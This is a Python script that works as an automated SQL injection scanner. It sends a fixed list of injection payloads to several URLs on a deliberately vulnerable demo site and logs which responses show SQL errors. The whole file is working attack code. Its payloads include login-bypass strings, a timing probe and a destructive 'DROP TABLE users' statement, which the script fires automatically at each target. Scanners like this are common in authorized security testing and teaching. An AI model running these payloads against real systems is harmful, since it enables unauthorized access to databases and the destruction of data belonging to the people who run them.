import requests
import time

# List of payloads for SQL injection testing
payloads = [
    "' OR '1'='1' --",
    "' OR 'a'='a' --",
    "'; DROP TABLE users --",
    "' OR ''='1",
    '" OR ""="1',
    "' OR SLEEP(5) --",
    "' AND 1=1 --",
    "' AND 1=2 --",
]

# List of known vulnerable URLs and their parameters
test_sites = [
    {
        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
        "parameter": "cat"
    },
    {
        "url": "http://testphp.vulnweb.com/product.php?id=1",
        "parameter": "id"
    },
    {
        "url": "http://testphp.vulnweb.com/news.php?id=1",
        "parameter": "id"
    }
]

# Function to test for SQL injection vulnerabilities
def test_sql_injection(url, parameter):
    results = []
    for payload in payloads:
        test_url = url.replace(parameter + '=', parameter + '=' + payload)
        print(f'Testing {test_url}')
        for attempt in range(3):  # Retry up to 3 times
            try:
                response = requests.get(test_url, timeout=15)  # Increased timeout
                if response.status_code == 200:
                    content = response.content.decode('utf-8', errors='ignore')
                    # Check for specific error messages in content
                    if "SQL syntax" in content or "unrecognized" in content:
                        results.append((payload, "Potential SQL Injection vulnerability found!"))
                        print("Potential SQL Injection vulnerability found!")
                    else:
                        results.append((payload, "No vulnerability detected."))
                    print(f"Response Code: {response.status_code}, Content Length: {len(response.content)}")
                    break  # Exit retry loop on success
                else:
                    results.append((payload, f"Failed to retrieve: {response.status_code}"))
                    print(f"Failed to retrieve: {response.status_code}")
                    break
            except requests.exceptions.ReadTimeout:
                print("Request timed out, retrying...")
                time.sleep(1)  # Optional: wait before retrying
            except requests.exceptions.RequestException as e:
                print(f'Error during request: {e}')
                results.append((payload, f"Error during request: {e}"))
                break
        else:
            print("Max retries reached. Moving to the next payload.")
        time.sleep(1)  # Sleep to avoid overwhelming the server

    return results

# Main function to run the tests
def main():
    all_results = []
    for site in test_sites:
        print(f'\nScanning {site["url"]} for SQL injection vulnerabilities on parameter {site["parameter"]}...')
        results = test_sql_injection(site["url"], site["parameter"])
        all_results.append((site["url"], results))
    
    # Logging results to a file
    with open('sql_injection_results.txt', 'w') as log_file:
        for url, results in all_results:
            log_file.write(f'Scanning URL: {url}\n')
            for payload, outcome in results:
                log_file.write(f'Payload: {payload}, Outcome: {outcome}\n')
            log_file.write('\n')

    print("Results have been logged to sql_injection_results.txt.")

if __name__ == "__main__":
    main()
